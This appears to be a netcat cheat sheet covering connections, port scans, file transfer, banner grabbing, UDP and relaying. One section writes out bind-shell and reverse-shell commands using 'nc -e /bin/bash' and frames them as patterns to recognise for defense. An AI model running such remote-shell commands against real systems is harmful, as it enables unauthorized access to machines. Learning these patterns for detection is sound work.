# Netcat (nc) Cheat Sheet

> Flags vary between the traditional (`nc`, e.g. `nmap-ncat` or OpenBSD nc) and
> GNU netcat builds — check `nc -h` if a flag below doesn't behave as shown.
> `ncat` (from the nmap project) is a common modern drop-in with more features
> (SSL, proxying) using mostly the same flag set.

## Basic connect / listen
```bash
nc example.com 80                    # connect to a TCP port (manual HTTP request, telnet-style)
nc -l 1234                           # listen on TCP port 1234 (server side)
nc -l -p 1234                        # some builds require -p for the listen port
nc -v example.com 80                 # verbose: show connection status
nc -w 5 example.com 80               # give up after 5s if nothing connects
nc -z example.com 20-100             # scan mode: just test which ports are open, no data sent
```

## Port scanning (quick and dirty)
```bash
nc -zv example.com 22                # test a single port, verbose
nc -zv example.com 20-30             # scan a port range
nc -zvw2 example.com 1-1000          # scan with a 2s timeout per port (faster sweep)
```
**Why not just use `nmap`:** for a single quick "is this port open" check on a
box that already has `nc` but not `nmap`, this is faster to reach for. For
real scanning (service detection, stealth, many hosts), use `nmap`.

## File transfer
```bash
# receiver:
nc -l 1234 > received_file.txt
# sender:
nc <receiver-ip> 1234 < file_to_send.txt
```
**Why this works:** `nc` just pipes bytes between a socket and stdin/stdout —
whatever you redirect in on the sending side comes out the other end. No
protocol, no resume support, no integrity check of its own (pair with
`sha256sum` on both ends to confirm a clean transfer).

```bash
# whole directory, tar'd and streamed:
# receiver:
nc -l 1234 | tar xzf -
# sender:
tar czf - /path/to/dir | nc <receiver-ip> 1234
```

## Chat / simple messaging
```bash
# listener:
nc -l 1234
# other side:
nc <listener-ip> 1234
```
Whatever's typed on one side appears on the other — plain-text pipe both
ways until one side closes. Useful as a sanity check that a port/firewall
path is actually open before debugging the real application on top of it.

## Banner grabbing / manual protocol probing
```bash
nc example.com 80
# then type:
GET / HTTP/1.1
Host: example.com
# (blank line, then Enter, to complete the request)
```
```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80   # same thing, one-shot
nc example.com 25    # connect to SMTP and read the greeting banner manually
nc example.com 22    # SSH banner ("SSH-2.0-...") confirms the service without a full handshake
```
**Why this matters:** confirms *what* is actually listening on a port and
*how* it responds, independent of any client library's assumptions — useful
when a higher-level client fails and you need to rule out "wrong
port/service" before debugging further up the stack.

## UDP
```bash
nc -u example.com 53                 # UDP instead of TCP (add -u to almost any command above)
nc -u -l 5353                        # listen for UDP
nc -uzv example.com 53               # UDP port scan (unreliable — UDP has no handshake to confirm open)
```
**Why UDP scanning is unreliable:** a closed UDP port often gives no
response at all (indistinguishable from a dropped packet/firewall),
whereas a closed TCP port replies with `RST`. Treat UDP "open" results from
`nc`/`nmap` as "no reason to think it's closed," not a hard guarantee.

## Proxying / relaying
```bash
nc -l 1234 | nc example.com 80                          # crude one-way relay (listener -> forward)
mkfifo /tmp/pipe && nc -l 1234 < /tmp/pipe | nc example.com 80 > /tmp/pipe   # two-way relay via a named pipe
```
**Why the named-pipe version:** a plain `nc A | nc B` only relays one
direction (A's output into B's input); wiring both `nc` processes through a
shared FIFO lets bytes flow both ways, turning it into a basic TCP relay
without any dedicated proxy software installed.

## Executing a shell over the connection (know this for defense, not offense)
```bash
nc -l 1234 -e /bin/bash              # listener spawns a shell for whoever connects (needs -e support, often compiled out)
nc <target-ip> 1234 -e /bin/bash     # reverse shell: target connects out, offers a shell
```
**Why this is worth knowing even if you never run it:** this exact pattern
is what a lot of reverse-shell payloads look like in the wild — recognizing
`nc ... -e /bin/bash` (or the `mkfifo`/`bash -i` equivalent when `-e` isn't
compiled in) in a process list, cron job, or EDR alert is a useful signal.
Most distro-packaged `nc` builds ship without `-e` specifically because of
this misuse potential.

## Useful one-liners
```bash
nc -zv localhost 1-65535 2>&1 | grep succeeded              # find every open port on localhost
timeout 3 nc -zv example.com 443 && echo "reachable"           # scriptable reachability check with a hard timeout
nc -q1 example.com 25 <<< $'EHLO test\r\nQUIT\r'                 # send a couple lines and quit after 1s (-q, GNU nc)
date | nc -l 1234                                                  # trivially serve one line of output to whoever connects once
watch -n5 'nc -zv db-host 5432'                                       # poll a dependency until it comes up
```
